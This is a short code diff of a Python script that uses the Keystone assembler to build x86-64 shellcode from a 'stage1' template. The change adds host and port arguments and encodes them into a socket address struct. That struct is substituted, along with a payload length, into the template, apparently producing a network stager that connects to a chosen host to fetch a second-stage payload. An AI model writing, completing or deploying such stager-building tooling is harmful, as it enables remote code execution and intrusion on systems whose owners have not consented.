@@ -14,11 +14,24 @@ def deComment(str):
         final += s.split(";",1)[0] + "\n"
     return final
 
+import socket,struct
+
 def main():
-    if len(sys.argv) < 2:
-        print(f"Usage: python {sys.argv[0]} len_of_payload")
+    if len(sys.argv) < 4:
+        print(f"Usage: python {sys.argv[0]} host port len_of_payload")
     stage1 = readStage1()
-    payload = stage1.replace("_PAYLOAD_LENGTH_", hex(int(sys.argv[1])))
+    host = sys.argv[1]
+    port = sys.argv[2]
+    len_of_payload = int(sys.argv[3])
+    
+    ip = struct.unpack("I",socket.inet_aton(host))[0]
+    ip = hex(ip)
+    
+    port = bytearray(int(port).to_bytes(8, 'little')).hex()[:4]
+    pad = "%.4x" % 2
+    sock = ip + port + pad
+    
+    payload = stage1.replace("_SOCK_STRUCT_", sock).replace("_PAYLOAD_LENGTH_", hex(len_of_payload))
     payload = deComment(payload)
     print(payload)
     ks = Ks(KS_ARCH_X86, KS_MODE_64)
